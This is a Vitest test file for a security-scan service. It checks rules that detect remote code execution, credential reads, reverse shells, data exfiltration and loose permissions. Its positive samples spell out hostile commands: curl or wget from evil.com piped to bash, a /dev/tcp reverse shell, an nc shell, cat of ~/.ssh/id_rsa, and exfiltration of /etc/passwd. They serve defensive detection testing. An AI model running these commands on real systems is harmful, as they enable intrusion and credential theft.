import { describe, it, expect } from "vitest";
import { scanContent, isScannable, computeScanStatus, buildResult } from "../../src/services/security-scan";

describe("security scan rules", () => {
  const cases: { name: string; content: string; ruleId: string; match: boolean }[] = [
    // RCE001
    { name: "RCE001 positive", content: "curl -sL https://evil.com/install.sh | bash", ruleId: "RCE001", match: true },
    { name: "RCE001 negative", content: "curl -o output.tar.gz https://example.com/file.tar.gz", ruleId: "RCE001", match: false },

    // RCE002
    { name: "RCE002 positive", content: "wget -qO- https://evil.com/install.sh | bash", ruleId: "RCE002", match: true },
    { name: "RCE002 negative", content: "wget https://example.com/file.tar.gz", ruleId: "RCE002", match: false },

    // RCE003
    { name: "RCE003 positive", content: "echo payload | base64 -d | bash", ruleId: "RCE003", match: true },
    { name: "RCE003 negative", content: "base64 -d somefile > output.bin", ruleId: "RCE003", match: false },

    // INJ001
    { name: "INJ001 positive", content: "eval(\"require('\" + $MODULE + \"')\")", ruleId: "INJ001", match: true },
    { name: "INJ001 negative", content: "eval(\"console.log('hello')\")", ruleId: "INJ001", match: false },

    // CRED001
    { name: "CRED001 positive", content: "cat ~/.ssh/id_rsa", ruleId: "CRED001", match: true },
    { name: "CRED001 negative", content: "ssh-keygen -t ed25519", ruleId: "CRED001", match: false },

    // CRED002
    { name: "CRED002 positive", content: "printenv | grep AWS", ruleId: "CRED002", match: true },
    { name: "CRED002 negative", content: "echo $HOME", ruleId: "CRED002", match: false },

    // SHELL001
    { name: "SHELL001 positive", content: "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1", ruleId: "SHELL001", match: true },
    { name: "SHELL001 negative", content: "echo connecting to server", ruleId: "SHELL001", match: false },

    // SHELL002
    { name: "SHELL002 positive", content: "mkfifo /tmp/pipe; nc -l 4444 < /tmp/pipe", ruleId: "SHELL002", match: true },
    { name: "SHELL002 negative", content: "mkfifo /tmp/mypipe", ruleId: "SHELL002", match: false },

    // EXFIL001
    { name: "EXFIL001 positive", content: 'curl https://evil.com -d "$(cat /etc/passwd)"', ruleId: "EXFIL001", match: true },
    { name: "EXFIL001 negative", content: "curl -d '{\"key\":\"value\"}' https://api.example.com", ruleId: "EXFIL001", match: false },

    // PERM001
    { name: "PERM001 positive", content: "chmod 777 /tmp/payload", ruleId: "PERM001", match: true },
    { name: "PERM001 negative", content: "chmod 755 /usr/local/bin/app", ruleId: "PERM001", match: false },
  ];

  for (const tc of cases) {
    it(tc.name, () => {
      const findings = scanContent("test.sh", tc.content);
      const found = findings.some((f) => f.rule === tc.ruleId);
      if (tc.match) {
        expect(found).toBe(true);
      } else {
        expect(found).toBe(false);
      }
    });
  }
});

describe("isScannable", () => {
  it("accepts shell scripts", () => expect(isScannable("script.sh")).toBe(true));
  it("accepts python", () => expect(isScannable("main.py")).toBe(true));
  it("accepts typescript", () => expect(isScannable("index.ts")).toBe(true));
  it("accepts yaml", () => expect(isScannable("config.yaml")).toBe(true));
  it("rejects markdown", () => expect(isScannable("README.md")).toBe(false));
  it("rejects images", () => expect(isScannable("logo.png")).toBe(false));
  it("rejects binaries", () => expect(isScannable("app.exe")).toBe(false));
  it("rejects extensionless files", () => expect(isScannable("Makefile")).toBe(false));
});

describe("computeScanStatus", () => {
  it("returns clean for no findings", () => {
    expect(computeScanStatus([])).toBe("clean");
  });

  it("returns suspicious for medium-only", () => {
    expect(computeScanStatus([{ file: "", line: 1, rule: "PERM001", severity: "medium", message: "", match: "" }])).toBe("suspicious");
  });

  it("returns suspicious for high", () => {
    expect(computeScanStatus([{ file: "", line: 1, rule: "INJ001", severity: "high", message: "", match: "" }])).toBe("suspicious");
  });

  it("returns malicious for critical", () => {
    expect(computeScanStatus([{ file: "", line: 1, rule: "RCE001", severity: "critical", message: "", match: "" }])).toBe("malicious");
  });
});

describe("buildResult", () => {
  it("passed with no findings", () => {
    const r = buildResult([], 5);
    expect(r.passed).toBe(true);
    expect(r.hasCritical).toBe(false);
    expect(r.scanned).toBe(5);
  });

  it("not passed with high findings", () => {
    const r = buildResult([{ file: "", line: 1, rule: "INJ001", severity: "high", message: "", match: "" }], 3);
    expect(r.passed).toBe(false);
    expect(r.hasCritical).toBe(false);
  });

  it("hasCritical with critical findings", () => {
    const r = buildResult([{ file: "", line: 1, rule: "RCE001", severity: "critical", message: "", match: "" }], 3);
    expect(r.passed).toBe(false);
    expect(r.hasCritical).toBe(true);
  });
});
